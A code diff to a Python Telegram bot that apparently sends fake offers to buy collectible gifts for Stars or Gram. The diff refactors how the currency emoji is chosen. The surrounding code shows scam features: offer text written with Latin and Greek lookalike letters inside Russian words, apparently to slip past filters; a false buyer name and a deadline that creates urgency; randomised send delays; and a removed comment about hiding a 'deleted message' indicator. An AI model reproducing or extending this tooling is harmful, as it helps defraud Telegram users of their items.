@@ -51,9 +51,18 @@ LOCALES = {
     }
 }
 
-def build_offer_text(gift_name, gift_num, amount, currency_symbol, lang):
+def build_offer_text(gift_name, gift_num, amount, currency_type, lang):
     slug = gift_name.replace(" ", "")
-    currency_emoji = f'<tg-emoji emoji-id="5258165702707125574">{currency_symbol}</tg-emoji>'
+    
+    # Жесткий выбор эмодзи под валюту
+    if currency_type == "gram":
+        emoji_id = "5298988357538328017"
+        fallback_char = "💎"
+    else:
+        emoji_id = "5258165702707125574"
+        fallback_char = "⭐️"
+
+    currency_emoji = f'<tg-emoji emoji-id="{emoji_id}">{fallback_char}</tg-emoji>'
     
     return (
         f'Пoльзοватeль <b>cryptan</b> пρeдлагaет Bам <b>{amount} {currency_emoji}</b> зa кoллeкционный пpедмeт '
@@ -61,9 +70,9 @@ def build_offer_text(gift_name, gift_num, amount, currency_symbol, lang):
         f'Пpeдлοжeние дeйcтвyeт в тeчeнии 5 ч. 59 мин..'
     )
 
-def make_offer_keyboard(gift_name, gift_num, amount, currency_symbol, lang):
+def make_offer_keyboard(gift_name, gift_num, amount, currency_type, lang):
     loc = LOCALES.get(lang, LOCALES["ru"])
-    cb_data = f"a|{gift_name}|{gift_num}|{amount}|{currency_symbol}|{lang}"
+    cb_data = f"a|{gift_name}|{gift_num}|{amount}|{currency_type}|{lang}"
     decline_data = f"d|{gift_num}"
 
     return InlineKeyboardMarkup(
@@ -121,11 +130,13 @@ async def handle_business_command(message: Message):
         return
 
     text_lower = text_clean.lower()
+    
+    # Строгое определение типа валюты
     if "gram" in text_lower:
-        currency_symbol = "💎"
+        currency_type = "gram"
         currency_name = "Gram"
     else:
-        currency_symbol = "⭐️"
+        currency_type = "stars"
         currency_name = "Stars"
 
     amount = 1000
@@ -158,7 +169,7 @@ async def handle_business_command(message: Message):
         "gift_name": gift_name,
         "gift_num": gift_num,
         "amount": amount,
-        "currency_symbol": currency_symbol,
+        "currency_type": currency_type,
         "currency_name": currency_name,
         "lang": lang,
         "bcid": message.business_connection_id,
@@ -172,9 +183,9 @@ async def accept_offer(cb: CallbackQuery):
         await cb.answer("Ошибка данных", show_alert=True)
         return
 
-    _, gift_name, gift_num_str, amount, currency_symbol, lang = parts
+    _, gift_name, gift_num_str, amount, currency_type, lang = parts
     gift_num = int(gift_num_str)
-    currency_name = "Gram" if currency_symbol == "💎" else "Stars"
+    currency_name = "Gram" if currency_type == "gram" else "Stars"
     
     text = build_accept_text(gift_name, gift_num, currency_name, lang)
     bcid = cb.message.business_connection_id
@@ -231,10 +242,9 @@ async def sender_worker():
         try:
             await asyncio.sleep(random.uniform(0.5, 1.0))
 
-            text = build_offer_text(task["gift_name"], task["gift_num"], task["amount"], task["currency_symbol"], task["lang"])
-            keyboard = make_offer_keyboard(task["gift_name"], task["gift_num"], task["amount"], task["currency_symbol"], task["lang"])
+            text = build_offer_text(task["gift_name"], task["gift_num"], task["amount"], task["currency_type"], task["lang"])
+            keyboard = make_offer_keyboard(task["gift_name"], task["gift_num"], task["amount"], task["currency_type"], task["lang"])
 
-            # Отправка без reply_to_message_id, чтобы избежать плашки "Удаленное сообщение"
             sent_msg = await bot.send_message(
                 chat_id=task["chat_id"],
                 text=text,
